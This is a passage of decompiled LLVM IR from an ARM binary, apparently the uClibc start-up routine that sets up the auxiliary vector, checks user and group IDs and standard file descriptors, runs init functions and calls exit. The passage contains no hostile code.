  store i32 %arg6, i32* %v4_e01051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_e01c = load i32, i32* %r3.global-to-local, align 4
  %v2_e01c = load i32, i32* %r4.global-to-local, align 4
  %v3_e01c = inttoptr i32 %v2_e01c to i32*
  store i32 %v1_e01c, i32* %v3_e01c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_e020 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_e020, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_e028 = bitcast i32* %stack_var_-120 to i8*
  %v4_e028 = call i32 @__GI_memset(i8* %v3_e028, i32 0, i32 120)
  store i32 %v4_e028, i32* %r0.global-to-local, align 4
  %v0_e02c = load i32, i32* %r4.global-to-local, align 4
  %v1_e02c = inttoptr i32 %v0_e02c to i32*
  %v2_e02c = load i32, i32* %v1_e02c, align 4
  br label %dec_label_pc_e038

dec_label_pc_e038:                                ; preds = %dec_label_pc_e038, %bb77
  %storemerge = phi i32 [ %v2_e02c, %bb77 ], [ %v1_e044, %dec_label_pc_e038 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_e038 = inttoptr i32 %storemerge to i32*
  %v2_e038 = load i32, i32* %v1_e038, align 4
  store i32 %v2_e038, i32* %r3.global-to-local, align 4
  %v2_e03c = icmp eq i32 %v2_e038, 0
  %v1_e044 = add i32 %storemerge, 4
  br i1 %v2_e03c, label %dec_label_pc_e044, label %dec_label_pc_e038

dec_label_pc_e044:                                ; preds = %dec_label_pc_e038
  store i32 %v1_e044, i32* @r4, align 4
  store i32 %v2_e020, i32* @r5, align 4
  %v1_e06830 = inttoptr i32 %v1_e044 to i32*
  %v2_e06831 = load i32, i32* %v1_e06830, align 4
  store i32 %v2_e06831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e06c33 = icmp eq i32 %v2_e06831, 0
  store i1 %v2_e06c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e06c33, label %dec_label_pc_e074, label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %dec_label_pc_e044, %dec_label_pc_e068
  %v4_e058 = phi i32 [ %v1_e064, %dec_label_pc_e068 ], [ %v1_e044, %dec_label_pc_e044 ]
  %v5_e054 = phi i32 [ %v2_e068, %dec_label_pc_e068 ], [ %v2_e06831, %dec_label_pc_e044 ]
  %v2_e050 = icmp ugt i32 %v5_e054, 13
  store i1 %v2_e050, i1* %cpsr_c.global-to-local, align 1
  %v7_e050 = icmp eq i32 %v5_e054, 14
  store i1 %v7_e050, i1* %cpsr_z.global-to-local, align 1
  %v2_e054 = xor i1 %v2_e050, true
  %v3_e054 = or i1 %v7_e050, %v2_e054
  br i1 %v3_e054, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_e050
  %v4_e054 = load i32, i32* @r5, align 4
  %v6_e054 = and i32 %v5_e054, 536870912
  %v7_e054 = icmp ne i32 %v6_e054, 0
  store i1 %v7_e054, i1* %cpsr_c.global-to-local, align 1
  %v8_e054 = mul i32 %v5_e054, 8
  %v9_e054 = add i32 %v4_e054, %v8_e054
  store i32 %v9_e054, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_e050, %bb78
  %v1_e060 = phi i1 [ %v2_e050, %dec_label_pc_e050 ], [ %v7_e054, %bb78 ]
  %v2_e058 = xor i1 %v1_e060, true
  %v3_e058 = or i1 %v7_e050, %v2_e058
  br i1 %v3_e058, label %bb80, label %dec_label_pc_e068

bb80:                                             ; preds = %bb79
  store i32 %v4_e058, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e068

dec_label_pc_e068:                                ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_e058, i32 ptrtoint (i32* @global_var_acc0.275 to i32))
  %v0_e064 = load i32, i32* @r4, align 4
  %v1_e064 = add i32 %v0_e064, 8
  store i32 %v1_e064, i32* @r4, align 4
  %v1_e068 = inttoptr i32 %v1_e064 to i32*
  %v2_e068 = load i32, i32* %v1_e068, align 4
  store i32 %v2_e068, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e06c = icmp eq i32 %v2_e068, 0
  store i1 %v2_e06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e06c, label %dec_label_pc_e074, label %dec_label_pc_e050

dec_label_pc_e074:                                ; preds = %dec_label_pc_e068, %dec_label_pc_e044
  store i32 %v2_e020, i32* %r0.global-to-local, align 4
  %v1_e078 = call i32 @_dl_aux_init(i32 %v2_e020)
  store i32 %v1_e078, i32* %r0.global-to-local, align 4
  %v1_e07c = call i32 @__GI___uClibc_init(i32 %v1_e078)
  store i32 %v1_e07c, i32* @r0, align 4
  store i32 156, i32* %r3.global-to-local, align 4
  %v2_e084 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_e084, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_e08c = add i32 %v2_e084, 156
  %v3_e08c = inttoptr i32 %v2_e08c to i32*
  %v4_e08c = load i32, i32* %v3_e08c, align 4
  store i32 %v4_e08c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e094 = icmp eq i32 %tmp66, 0
  store i1 %v2_e094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e094, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_e074
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_e074, %bb81
  %v0_e0a0 = phi i32 [ %tmp66, %dec_label_pc_e074 ], [ 4096, %bb81 ]
  %v3_e09c = icmp eq i32 %tmp65, -1
  store i1 %v3_e09c, i1* %cpsr_c.global-to-local, align 1
  %v8_e09c = icmp eq i32 %tmp65, -1
  store i1 %v8_e09c, i1* %cpsr_z.global-to-local, align 1
  %v2_e0a0 = inttoptr i32 %v4_e08c to i32*
  store i32 %v0_e0a0, i32* %v2_e0a0, align 4
  br i1 %v3_e09c, label %dec_label_pc_e0a8, label %dec_label_pc_e0d0

dec_label_pc_e0a8:                                ; preds = %bb82
  %v0_e0a8 = call i32 @getuid()
  store i32 %v0_e0a8, i32* @r0, align 4
  store i32 %v0_e0a8, i32* %r4.global-to-local, align 4
  %v0_e0b0 = call i32 @geteuid()
  store i32 %v0_e0b0, i32* @r0, align 4
  %v3_e0b4 = icmp uge i32 %v0_e0a8, %v0_e0b0
  store i1 %v3_e0b4, i1* %cpsr_c.global-to-local, align 1
  %v9_e0b4 = icmp eq i32 %v0_e0a8, %v0_e0b0
  store i1 %v9_e0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e0b4, label %dec_label_pc_e0bc, label %dec_label_pc_e0f8

dec_label_pc_e0bc:                                ; preds = %dec_label_pc_e0a8
  %v1_e0bc = call i32 @getgid(i32 %v0_e0b0)
  store i32 %v1_e0bc, i32* @r0, align 4
  store i32 %v1_e0bc, i32* %r4.global-to-local, align 4
  %v0_e0c4 = call i32 @getegid()
  store i32 %v0_e0c4, i32* %r0.global-to-local, align 4
  %v3_e0c8 = icmp uge i32 %v1_e0bc, %v0_e0c4
  store i1 %v3_e0c8, i1* %cpsr_c.global-to-local, align 1
  %v9_e0c8 = icmp eq i32 %v1_e0bc, %v0_e0c4
  store i1 %v9_e0c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e0c8, label %dec_label_pc_e0d0, label %dec_label_pc_e0f8

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0bc, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_e09c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_e09c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e09c, label %dec_label_pc_e120, label %dec_label_pc_e0dc

dec_label_pc_e0dc:                                ; preds = %dec_label_pc_e0d0
  store i32 %tmp64, i32* @r3, align 4
  %v3_e0e0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_e0e0, i1* %cpsr_c.global-to-local, align 1
  %v9_e0e0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_e0e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e0e0, label %dec_label_pc_e0e8, label %dec_label_pc_e0f8

dec_label_pc_e0e8:                                ; preds = %dec_label_pc_e0dc
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_e0f0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_e0f0, i1* %cpsr_c.global-to-local, align 1
  %v9_e0f0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_e0f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e0f0, label %dec_label_pc_e120, label %dec_label_pc_e0f8

dec_label_pc_e0f8:                                ; preds = %dec_label_pc_e0dc, %dec_label_pc_e0bc, %dec_label_pc_e0a8, %dec_label_pc_e0e8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_e104 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_e10c = load i32, i32* @r4, align 4
  store i32 %v0_e10c, i32* %r1.global-to-local, align 4
  %v2_e110 = call i32 @__check_one_fd(i32 1, i32 %v0_e10c)
  %v0_e114 = load i32, i32* @r4, align 4
  store i32 %v0_e114, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_e11c = call i32 @__check_one_fd(i32 2, i32 %v0_e114)
  store i32 %v2_e11c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e120

dec_label_pc_e120:                                ; preds = %dec_label_pc_e0e8, %dec_label_pc_e0d0, %dec_label_pc_e0f8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 452, i32* %r3.global-to-local, align 4
  %v2_e128 = load i32, i32* %arg3, align 4
  store i32 %v2_e128, i32* %r2.global-to-local, align 4
  %v2_e12c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_e12c, i32* %r1.global-to-local, align 4
  %v3_e130 = add i32 %v2_e12c, 452
  %v4_e130 = inttoptr i32 %v3_e130 to i32*
  store i32 %v2_e128, i32* %v4_e130, align 4
  %v0_e134 = load i32, i32* %r0.global-to-local, align 4
  %v1_e134 = inttoptr i32 %v0_e134 to i32*
  %v2_e134 = load i32, i32* %v1_e134, align 4
  store i32 %v2_e134, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e138 = icmp eq i32 %v2_e134, 0
  store i1 %v2_e138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e138, label %bb84, label %dec_label_pc_e140

dec_label_pc_e140:                                ; preds = %dec_label_pc_e120
  store i32 172, i32* %r3.global-to-local, align 4
  %v0_e144 = load i32, i32* %r1.global-to-local, align 4
  %v2_e144 = add i32 %v0_e144, 172
  %v3_e144 = inttoptr i32 %v2_e144 to i32*
  %v4_e144 = load i32, i32* %v3_e144, align 4
  store i32 %v4_e144, i32* %r3.global-to-local, align 4
  %v2_e148 = inttoptr i32 %v4_e144 to i32*
  store i32 %v2_e134, i32* %v2_e148, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_e150 = load i32, i32* %r0.global-to-local, align 4
  %v1_e150 = inttoptr i32 %v0_e150 to i32*
  %v2_e150 = load i32, i32* %v1_e150, align 4
  store i32 %v2_e150, i32* %r0.global-to-local, align 4
  %v4_e154 = call i32 @__GI_strrchr(i32 %v2_e150, i32 47, i32 %v2_e128, i32 %v4_e144)
  store i32 %v4_e154, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_e15c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_e15c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e160 = icmp eq i32 %v4_e154, 0
  store i1 %v2_e160, i1* %cpsr_z.global-to-local, align 1
  %v2_e164 = add i32 %v2_e15c, 104
  %v3_e164 = inttoptr i32 %v2_e164 to i32*
  %v4_e164 = load i32, i32* %v3_e164, align 4
  store i32 %v4_e164, i32* %r2.global-to-local, align 4
  br i1 %v2_e160, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_e140
  %v2_e16c58 = inttoptr i32 %v4_e164 to i32*
  store i32 0, i32* %v2_e16c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_e140
  %v2_e168 = add i32 %v4_e154, 1
  store i32 %v2_e168, i32* %r3.global-to-local, align 4
  %v2_e16c = inttoptr i32 %v4_e164 to i32*
  store i32 %v4_e154, i32* %v2_e16c, align 4
  %v1_e170 = load i32, i32* %r3.global-to-local, align 4
  %v2_e170 = load i32, i32* %r2.global-to-local, align 4
  %v3_e170 = inttoptr i32 %v2_e170 to i32*
  store i32 %v1_e170, i32* %v3_e170, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_e120
  %v2_e180 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_e180, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_e18c = add i32 %v2_e180, -12
  store i32 %v2_e18c, i32* %r5.global-to-local, align 4
  store i32 2620, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_e19c = add i32 %v2_e180, 2620
  %v4_e19c = inttoptr i32 %v3_e19c to i32*
  store i32 %arg5, i32* %v4_e19c, align 4
  %v0_e1b418 = load i32, i32* %r4.global-to-local, align 4
  %v1_e1b419 = load i32, i32* %r7.global-to-local, align 4
  %v3_e1b421 = icmp uge i32 %v0_e1b418, %v1_e1b419
  store i1 %v3_e1b421, i1* %cpsr_c.global-to-local, align 1
  %v9_e1b427 = icmp eq i32 %v0_e1b418, %v1_e1b419
  store i1 %v9_e1b427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e1b421, label %dec_label_pc_e1e8.lr.ph, label %dec_label_pc_e1a4

dec_label_pc_e1a4:                                ; preds = %bb84, %dec_label_pc_e1a4
  %v1_e1a4 = phi i32 [ %v1_e1b0, %dec_label_pc_e1a4 ], [ %v0_e1b418, %bb84 ]
  %v0_e1a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_e1a4 = and i32 %v1_e1a4, 1073741824
  %v3_e1a4 = icmp ne i32 %v2_e1a4, 0
  store i1 %v3_e1a4, i1* %cpsr_c.global-to-local, align 1
  %v4_e1a4 = mul i32 %v1_e1a4, 4
  %v5_e1a4 = add i32 %v4_e1a4, %v0_e1a4
  %v6_e1a4 = inttoptr i32 %v5_e1a4 to i32*
  %v7_e1a4 = load i32, i32* %v6_e1a4, align 4
  store i32 %v7_e1a4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_e1a4)
  %v0_e1b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_e1b0 = add i32 %v0_e1b0, 1
  store i32 %v1_e1b0, i32* %r4.global-to-local, align 4
  %v1_e1b4 = load i32, i32* %r7.global-to-local, align 4
  %v3_e1b4 = icmp uge i32 %v1_e1b0, %v1_e1b4
  store i1 %v3_e1b4, i1* %cpsr_c.global-to-local, align 1
  %v9_e1b4 = icmp eq i32 %v1_e1b0, %v1_e1b4
  store i1 %v9_e1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e1b4, label %dec_label_pc_e1e8.lr.ph, label %dec_label_pc_e1a4

dec_label_pc_e1e8.lr.ph:                          ; preds = %dec_label_pc_e1a4, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e1bc = icmp eq i32 %v0_e008, 0
  store i1 %v2_e1bc, i1* %cpsr_z.global-to-local, align 1
  %v2_e1c4 = xor i1 %v2_e1bc, true
  call void @__pseudo_cond_branch(i1 %v2_e1c4, i32 %v0_e008)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_e1d0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_e1dc = add i32 %v2_e1d0, -12
  store i32 %v2_e1dc, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e1e8

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1e8.dec_label_pc_e1e8_crit_edge, %dec_label_pc_e1e8.lr.ph
  %v1_e1e8 = phi i32 [ %v1_e1f4, %dec_label_pc_e1e8.dec_label_pc_e1e8_crit_edge ], [ 0, %dec_label_pc_e1e8.lr.ph ]
  %v0_e1e8 = phi i32 [ %v0_e1e8.pre, %dec_label_pc_e1e8.dec_label_pc_e1e8_crit_edge ], [ %v2_e1dc, %dec_label_pc_e1e8.lr.ph ]
  %v2_e1e8 = and i32 %v1_e1e8, 1073741824
  %v3_e1e8 = icmp ne i32 %v2_e1e8, 0
  store i1 %v3_e1e8, i1* %cpsr_c.global-to-local, align 1
  %v4_e1e8 = mul i32 %v1_e1e8, 4
  %v5_e1e8 = add i32 %v4_e1e8, %v0_e1e8
  %v6_e1e8 = inttoptr i32 %v5_e1e8 to i32*
  %v7_e1e8 = load i32, i32* %v6_e1e8, align 4
  store i32 %v7_e1e8, i32* %ip.global-to-local, align 4
  store i32 57844, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_e1e8)
  %v0_e1f4 = load i32, i32* @r4, align 4
  %v1_e1f4 = add i32 %v0_e1f4, 1
  store i32 %v1_e1f4, i32* @r4, align 4
  %v1_e1f8 = load i32, i32* @r7, align 4
  %v3_e1f8 = icmp uge i32 %v1_e1f4, %v1_e1f8
  store i1 %v3_e1f8, i1* %cpsr_c.global-to-local, align 1
  %v9_e1f8 = icmp eq i32 %v1_e1f4, %v1_e1f8
  store i1 %v9_e1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e1f8, label %dec_label_pc_e200, label %dec_label_pc_e1e8.dec_label_pc_e1e8_crit_edge

dec_label_pc_e1e8.dec_label_pc_e1e8_crit_edge:    ; preds = %dec_label_pc_e1e8
  %v0_e1e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e1e8

dec_label_pc_e200:                                ; preds = %dec_label_pc_e1e8
  %v2_e204.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_e204.pre, i32* %r0.global-to-local, align 4
  %v2_e208 = add i32 %v2_e204.pre, -95824
  store i32 %v2_e208, i32* %r2.global-to-local, align 4
  store i32 %v2_e208, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e210 = icmp eq i32 %v2_e208, 0
  store i1 %v2_e210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e210, label %dec_label_pc_e228, label %dec_label_pc_e218

dec_label_pc_e218:                                ; preds = %dec_label_pc_e200
  store i32 57888, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_e208)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e224 = load i32, i32* %r0.global-to-local, align 4
  %v2_e224 = inttoptr i32 %v1_e224 to i32*
  store i32 0, i32* %v2_e224, align 4
  %v2_e22c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_e228

dec_label_pc_e228:                                ; preds = %dec_label_pc_e200, %dec_label_pc_e218
  %v2_e22c = phi i32 [ %v2_e204.pre, %dec_label_pc_e200 ], [ %v2_e22c.pre, %dec_label_pc_e218 ]
  store i32 136, i32* %r3.global-to-local, align 4
  store i32 %v2_e22c, i32* %r1.global-to-local, align 4
  %v2_e230 = add i32 %v2_e22c, 136
  %v3_e230 = inttoptr i32 %v2_e230 to i32*
  %v4_e230 = load i32, i32* %v3_e230, align 4
  store i32 %v4_e230, i32* %r2.global-to-local, align 4
  store i32 %v4_e230, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e238 = icmp eq i32 %v4_e230, 0
  store i1 %v2_e238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e238, label %dec_label_pc_e250, label %dec_label_pc_e240

dec_label_pc_e240:                                ; preds = %dec_label_pc_e228
  store i32 57928, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_e230)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e24c = load i32, i32* %r0.global-to-local, align 4
  %v2_e24c = inttoptr i32 %v1_e24c to i32*
  store i32 0, i32* %v2_e24c, align 4
  br label %dec_label_pc_e250

dec_label_pc_e250:                                ; preds = %dec_label_pc_e228, %dec_label_pc_e240
  %v2_e250 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_e250, i32* @r0, align 4
  %v1_e254 = call i32 @_setjmp(i32 %v2_e250)
  store i32 %v1_e254, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e258 = icmp eq i32 %v1_e254, 0
  store i1 %v2_e258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e258, label %dec_label_pc_e260, label %dec_label_pc_e2ac

dec_label_pc_e260:                                ; preds = %dec_label_pc_e250
  %v0_e260 = call i32 @__aeabi_read_tp()
  store i32 %v0_e260, i32* %r0.global-to-local, align 4
  %v1_e264 = add i32 %v0_e260, -1168
  store i32 %v1_e264, i32* %r2.global-to-local, align 4
  %v2_e26c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_e26c, i32* %r4.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_e278 = add i32 %v2_e26c, 60
  %v3_e278 = inttoptr i32 %v2_e278 to i32*
  %v4_e278 = load i32, i32* %v3_e278, align 4
  store i32 %v4_e278, i32* %ip.global-to-local, align 4
  store i32 %v2_e250, i32* %r3.global-to-local, align 4
  %v2_e288 = add i32 %v0_e260, -1040
  %v3_e288 = inttoptr i32 %v2_e288 to i32*
  store i32 %v2_e250, i32* %v3_e288, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_e294 = load i32, i32* %ip.global-to-local, align 4
  %v1_e294 = inttoptr i32 %v0_e294 to i32*
  %v2_e294 = load i32, i32* %v1_e294, align 4
  store i32 %v2_e294, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_e2a4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e348

dec_label_pc_e2ac:                                ; preds = %dec_label_pc_e250
  store i32 44, i32* %r3.global-to-local, align 4
  %v2_e2b0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_e2b0, i32* %ip.global-to-local, align 4
  %v2_e2b4 = add i32 %v2_e2b0, 44
  %v3_e2b4 = inttoptr i32 %v2_e2b4 to i32*
  %v4_e2b4 = load i32, i32* %v3_e2b4, align 4
  store i32 %v4_e2b4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e2b4)
  store i32 128, i32* %r3.global-to-local, align 4
  %v2_e2c4 = load i32, i32* %stack_var_-416, align 4
  %v2_e2c8 = add i32 %v2_e2c4, 128
  %v3_e2c8 = inttoptr i32 %v2_e2c8 to i32*
  %v4_e2c8 = load i32, i32* %v3_e2c8, align 4
  store i32 %v4_e2c8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e2cc

dec_label_pc_e2cc:                                ; preds = %dec_label_pc_e300.dec_label_pc_e2cc_crit_edge, %dec_label_pc_e2ac
  %v0_e2cc = phi i32 [ %v0_e2cc.pre, %dec_label_pc_e300.dec_label_pc_e2cc_crit_edge ], [ %v4_e2c8, %dec_label_pc_e2ac ]
  %v1_e2cc = inttoptr i32 %v0_e2cc to i32*
  %v2_e2cc = load i32, i32* %v1_e2cc, align 4
  store i32 %v0_e2cc, i32* %r2.global-to-local, align 4
  store i32 %v2_e2cc, i32* %r4.global-to-local, align 4
  %v1_e2d8 = add i32 %v2_e2cc, -1
  store i32 %v1_e2d8, i32* %r1.global-to-local, align 4
  %v2_e2dc89 = load i32, i32* %v1_e2cc, align 4
  store i32 %v2_e2dc89, i32* %r3.global-to-local, align 4
  %v3_e2e091 = icmp uge i32 %v2_e2dc89, %v2_e2cc
  store i1 %v3_e2e091, i1* %cpsr_c.global-to-local, align 1
  %v9_e2e097 = icmp eq i32 %v2_e2dc89, %v2_e2cc
  store i1 %v9_e2e097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e2e097, label %dec_label_pc_e2e8, label %dec_label_pc_e300

dec_label_pc_e2e8:                                ; preds = %dec_label_pc_e2cc, %dec_label_pc_e2e8.dec_label_pc_e2dc_crit_edge
  %v0_e2e898 = phi i32 [ %v1_e2e0.pre, %dec_label_pc_e2e8.dec_label_pc_e2dc_crit_edge ], [ %v2_e2cc, %dec_label_pc_e2cc ]
  store i32 %v0_e2e898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e2f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e2f8, label %dec_label_pc_e2fc, label %dec_label_pc_e2e8.dec_label_pc_e2dc_crit_edge

dec_label_pc_e2e8.dec_label_pc_e2dc_crit_edge:    ; preds = %dec_label_pc_e2e8
  %v0_e2dc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e2e0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e2dc = inttoptr i32 %v0_e2dc.pre to i32*
  %v2_e2dc = load i32, i32* %v1_e2dc, align 4
  store i32 %v2_e2dc, i32* %r3.global-to-local, align 4
  %v3_e2e0 = icmp uge i32 %v2_e2dc, %v1_e2e0.pre
  store i1 %v3_e2e0, i1* %cpsr_c.global-to-local, align 1
  %v9_e2e0 = icmp eq i32 %v2_e2dc, %v1_e2e0.pre
  store i1 %v9_e2e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e2e0, label %dec_label_pc_e2e8, label %dec_label_pc_e300

dec_label_pc_e2fc:                                ; preds = %dec_label_pc_e2e8
  %v0_e2fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e2fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e300

dec_label_pc_e300:                                ; preds = %dec_label_pc_e2cc, %dec_label_pc_e2e8.dec_label_pc_e2dc_crit_edge, %dec_label_pc_e2fc
  %v0_e308 = phi i32 [ %v0_e2fc, %dec_label_pc_e2fc ], [ %v2_e2dc89, %dec_label_pc_e2cc ], [ %v2_e2dc, %dec_label_pc_e2e8.dec_label_pc_e2dc_crit_edge ]
  %v1_e300 = phi i32 [ %v0_e2fc, %dec_label_pc_e2fc ], [ %v2_e2cc, %dec_label_pc_e2cc ], [ %v1_e2e0.pre, %dec_label_pc_e2e8.dec_label_pc_e2dc_crit_edge ]
  %v3_e300 = icmp uge i32 %v0_e308, %v1_e300
  store i1 %v3_e300, i1* %cpsr_c.global-to-local, align 1
  %v9_e300 = icmp eq i32 %v0_e308, %v1_e300
  store i1 %v9_e300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e300, label %dec_label_pc_e308, label %dec_label_pc_e300.dec_label_pc_e2cc_crit_edge

dec_label_pc_e300.dec_label_pc_e2cc_crit_edge:    ; preds = %dec_label_pc_e300
  %v0_e2cc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e2cc

dec_label_pc_e308:                                ; preds = %dec_label_pc_e300
  %v2_e308 = icmp ne i32 %v1_e300, 0
  store i1 %v2_e308, i1* %cpsr_c.global-to-local, align 1
  %v7_e308 = icmp eq i32 %v1_e300, 1
  store i1 %v7_e308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e308, label %dec_label_pc_e348, label %dec_label_pc_e310

dec_label_pc_e310:                                ; preds = %dec_label_pc_e308
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e348

dec_label_pc_e348:                                ; preds = %dec_label_pc_e308, %dec_label_pc_e310, %dec_label_pc_e260
  %storemerge2 = phi i32 [ %v0_e2a4, %dec_label_pc_e260 ], [ 0, %dec_label_pc_e310 ], [ 0, %dec_label_pc_e308 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_e34c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_e34c, i32* %r0.global-to-local, align 4
  %v0_e350 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e350, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_e348
  %v1_e350 = load i32, i32* %r1.global-to-local, align 4
  %v5_e350 = sdiv i32 %v1_e34c, 32
  %v6_e350 = and i32 %v1_e350, %v5_e350
  store i32 %v6_e350, i32* %r4.global-to-local, align 4
  %v2_e354 = load i32, i32* @r8, align 4
  %v8_e354 = shl i32 %v2_e354, %v1_e34c
  %v9_e354 = and i32 %v8_e354, %v1_e34c
  %v2_e358 = load i32, i32* %ip.global-to-local, align 4
  %v8_e358 = lshr i32 %v2_e358, %v9_e354
  %v9_e358 = and i32 %v8_e358, %v9_e354
  %v5_e35c = sdiv i32 %v9_e358, 1048576
  %v6_e35c = and i32 %v5_e35c, %v9_e358
